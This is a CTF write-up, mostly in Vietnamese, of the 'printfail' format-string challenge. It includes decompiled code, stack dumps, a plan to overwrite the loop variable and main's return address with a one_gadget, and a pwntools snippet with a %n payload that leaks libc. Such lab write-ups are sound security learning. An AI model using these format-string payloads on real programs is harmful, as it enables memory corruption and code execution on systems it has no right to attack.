# printfail

## IDA

```c
int __fastcall run_round(_DWORD *a1)
{
  memset(buf, 0, sizeof(buf));
  fflush(stdout);
  if ( !fgets(buf, 512, stdin) )
    return 0;
  *a1 = strlen(buf) <= 1;
  return printf(buf);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("I'll let you make one printf call. You control the format string. No do-overs.");
  v4 = 1;
  while ( v4 )
  {
    if ( !(unsigned int)run_round(&v4) )
      return 0;
    if ( v4 )
      puts("...That was an empty string. Come on, you've at least gotta try!\nOkay, I'll give you another chance.");
  }
  return 0;
}
```

## Định hướng

Em được hint là ow giá trị v4 của while để ta có thể đưa nhiều payload của mình vào.
Đầu tiên em thấy khi nhập giá trị ở hàm fgets và kiểm tra stack, em thấy dữ liệu nhập vào không lưu trong stack:

```c
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555259 → run_round()
[#1] 0x5555555552d0 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x007fffffffdc80│+0x0000: 0x007fffffffddc8  →  0x007fffffffe064  →  "/mnt/d/ctf/utctf/printfail"         ← $rsp
0x007fffffffdc88│+0x0008: 0x007fffffffdca4  →  0x6305730000000001
0x007fffffffdc90│+0x0010: 0x007fffffffdcb0  →  0x0000000000000001        ← $rbp
0x007fffffffdc98│+0x0018: 0x005555555552d0  →  <main+60> test eax, eax
0x007fffffffdca0│+0x0020: 0x0000000100001000
0x007fffffffdca8│+0x0028: 0x6890f61163057300
0x007fffffffdcb0│+0x0030: 0x0000000000000001
0x007fffffffdcb8│+0x0038: 0x007ffff7db5d90  →  <__libc_start_call_main+128> mov edi, eax
0x007fffffffdcc0│+0x0040: 0x0000000000000000
0x007fffffffdcc8│+0x0048: 0x00555555555294  →  <main+0> endbr64
```

Đến đây em khá bí và xin hint thì được hint là tìm cách thay đổi ret của hàm main là `c 0x007fffffffdcb8│+0x0038: 0x007ffff7db5d90  →  <__libc_start_call_main+128> mov edi, eax`
Em nghĩ là mình sẽ tìm địa chỉ stack nào đó có trỏ đến địa chỉ ret để thay đổi thành one_gadget.
Em tiếp tục tìm nhưng vẫn chưa thấy địa chỉ nào trỏ trực tiếp đến ret
Bí quá em xin hint và coi lại video 20 thì em thấy ở đây, có thể sử dụng để khai thác:

```c
0x007fffffffdc80│+0x0000: 0x007fffffffddc8  →  0x007fffffffe064  →  "/mnt/d/ctf/utctf/printfail" ,    ← $rsp  //here
0x007fffffffdc88│+0x0008: 0x007fffffffdca4  →  0x6305730000000001
0x007fffffffdc90│+0x0010: 0x007fffffffdcb0  →  0x0000000000000001        ← $rbp
```

thì các bước em khai thác như sau:

- dùng %n trỏ đến vị trí thứ 6, và ghi đè `0x007fffffffe064` thành `0x007fffffffdcb8` , khi đó tại `0x007fffffffddc8` ta có:

```c
0x007fffffffddc8 : 0x007fffffffdcb8  →  0x007ffff7db5d90  →  <__libc_start_call_main+128> mov edi, eax
```

- dùng %n trỏ đến vị trí thứ 43 đổi `0x007fffffffdcb8  →  0x007ffff7db5d90` thành one_gadget. okela

---

# Thực thi

### Bước 1: ta sẽ tính toán để thay đổi v4, nên là em sẽ ghi 8 vào vị trí thứ 7 là đã thay đổi giá trị v4  
![image](https://user-images.githubusercontent.com/111769169/224769758-d9f5f842-851b-479b-83e9-839ed89051a3.png)

### Bước 2: do file ko có hàm system nên ta sẽ phải leak libc.
Ta nên chọn vị trí 13 để leak vì nó là save rip của main và theo video 20 chú thích thì save rip nó tỉ lệ đúng hơn vì leak những thằng sau, khi chạy server nó là địa chỉ rác.

```python
    # %8c%7$n là để thoả điều kiện chạy loop để có thể input nhiều lần, nó đọc 8 kí tự từ %c và ghi vào
    r.sendlineafter(b"do-overs.\n", b"%8c%7$n %13$p")
    r.recvuntil(b"0x")
    leak = int(b"0x" + r.recvline(keepends=False), 16)
    libc.address = leak - 147587
    log.info("leak libc: " + hex(leak))
    log.info("leak base: " + hex(libc.address)) #leak libc tính địa chỉ base nè
```
